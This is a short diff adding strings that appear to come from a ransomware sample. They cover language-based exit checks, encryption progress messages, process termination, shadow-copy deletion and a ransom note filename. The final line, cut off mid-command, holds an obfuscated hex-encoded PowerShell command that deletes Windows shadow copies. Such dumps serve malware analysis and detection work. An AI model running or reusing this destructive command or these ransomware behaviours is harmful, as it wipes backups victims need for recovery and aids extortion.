@@ -1,0 +1,9 @@
+
+This is a Russian-Speaking System, Exit System Language Check Encrypting Network Shares Encrypting Local Disks README .TXT
+Encrypt Mode - AUTO Started %
+u I/O
+Workers Encrypted %u file(s)
+Start Encrypt [Handle %u]
+File Encrypted Successful Encrypt Mode - FAST Encrypt Mode - FULL Terminating Processes Deleting Shadow Copies Uninstalling Services Emptying
+Recycle Bin This is a Russian-Speaking System, Exit System Language Check Start Encrypting All Files powershell -ep bypass -c \"(0..
+61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F7763 6F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.
